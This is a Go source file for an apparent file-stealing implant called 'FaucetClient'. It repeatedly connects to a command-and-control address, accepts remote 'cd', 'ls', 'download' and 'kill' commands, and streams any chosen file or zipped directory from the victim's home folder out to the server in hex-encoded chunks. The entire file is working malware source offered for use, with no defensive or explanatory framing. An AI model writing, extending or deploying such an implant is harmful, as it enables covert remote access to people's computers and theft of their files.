package main

import (
	"FaucetClient/internal/coms"
	"FaucetClient/internal/encryption"
	"archive/zip"
	"bytes"
	"encoding/hex"
	"errors"
	"io"
	"io/fs"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
)

var C2 = "c2:port"
var Password = "changeme"
var Debug = false

func main() {
	encryption.Key = Password
	for {
		conn, err := net.Dial("tcp", C2)
		if err != nil {
			logerr(err)
			time.Sleep(3 * time.Second)
			continue
		}
		err = commandListener(conn)
		logerr(err)
		time.Sleep(3 * time.Second)
	}
}

func logerr(err error) bool {
	if Debug {
		log.Println(err)
	}
	return err != nil
}

func commandListener(conn net.Conn) error {
	for {
		req, err := coms.Read(conn)
		if err != nil {
			return err
		}

		for key, val_ := range req {
			var resp map[string]any
			userProf, err := os.UserHomeDir()
			if err != nil {
				resp = map[string]any{
					"result": "error",
				}
				break
			}

			val := strings.ReplaceAll(val_.(string), "%user%", userProf)

			switch key {
			case "download":
				err = getFile(val, conn)
				if err != nil {
					return err
				}

			case "cd":
				err := os.Chdir(val)
				if err != nil {
					resp = map[string]any{
						"result": "error",
					}
					break
				}
				resp = map[string]any{
					"result": "success",
				}

			case "ls":
				err = listDir(conn)
				if err != nil {
					return err
				}
			case "kill":
				os.Exit(0)
			}
			if len(resp) > 0 {
				err = coms.Send(resp, conn)
				if err != nil {
					return err
				}
			}
		}
	}
}

func listDir(conn net.Conn) error {
	items, err := os.ReadDir("./")
	if err != nil {
		return err
	}

	response := make(map[string]any)
	for _, item := range items {
		if item.IsDir() {
			response[item.Name()] = "d"
		} else {
			var size int64
			info, err := item.Info()
			if err != nil {
				size = 0
			} else {
				size = info.Size()
			}
			response[item.Name()] = strconv.Itoa(int(size))
		}
	}

	curdir, err := os.Getwd()
	if err != nil {
		return err
	}
	response["/curdir/"] = curdir

	return coms.Send(response, conn)
}

func getFile(file string, conn net.Conn) error {
	stat, err := os.Stat(file)
	if err != nil {
		return coms.Send(map[string]any{
			"result": "error",
		}, conn)
	}

	if stat.IsDir() {
		zipBuffer := &bytes.Buffer{}
		err = zipDir(file, zipBuffer)
		if err != nil {
			return coms.Send(map[string]any{
				"result": "error",
			}, conn)
		}

		for {
			smallerBuffer := make([]byte, 1048576)
			n, err := zipBuffer.Read(smallerBuffer)
			if err != nil {
				if err == io.EOF {
					break
				}
				logerr(err)
				break
			}

			smallerBuffer = smallerBuffer[0:n]
			chunk := hex.EncodeToString(smallerBuffer)
			err = coms.Send(map[string]any{
				"chunk": chunk,
			}, conn)
			if err != nil {
				logerr(err)
				return nil
			}
			recv, err := coms.Read(conn)
			if err != nil {
				logerr(err)
				return nil
			}
			if recv["result"] != "success" {
				logerr(errors.New("server responded weirdly"))
			}
		}

		coms.Send(map[string]any{
			"result": "success",
		}, conn)

		return nil
	}

	fileHandle, err := os.Open(file)
	if err != nil {
		return coms.Send(map[string]any{
			"result": "error",
		}, conn)
	}

	for {
		buffer := make([]byte, 1048576)
		n, err := fileHandle.Read(buffer)
		if err != nil {
			if err == io.EOF {
				break
			}
			logerr(err)
			break
		}

		buffer = buffer[0:n]
		chunk := hex.EncodeToString(buffer)
		err = coms.Send(map[string]any{
			"chunk": chunk,
		}, conn)
		if err != nil {
			break
		}
		recv, err := coms.Read(conn)
		if err != nil {
			logerr(err)
			return nil
		}
		if recv["result"] != "success" {
			logerr(errors.New("server responded weirdly"))
		}
	}

	coms.Send(map[string]any{
		"result": "success",
	}, conn)

	return nil
}

func zipDir(pathToZip string, buffer *bytes.Buffer) error {
	fSys := os.DirFS(pathToZip)
	nZip := zip.NewWriter(buffer)
	defer nZip.Close()

	return fs.WalkDir(fSys, ".", func(path string, dir fs.DirEntry, err error) error {
		if err != nil || dir.IsDir() {
			return err
		}

		compressor, err := nZip.Create(path)
		if err != nil {
			return err
		}

		fHandle, err := fSys.Open(path)
		if err != nil {
			return err
		}
		defer fHandle.Close()

		io.Copy(compressor, fHandle)

		return nil
	})
}
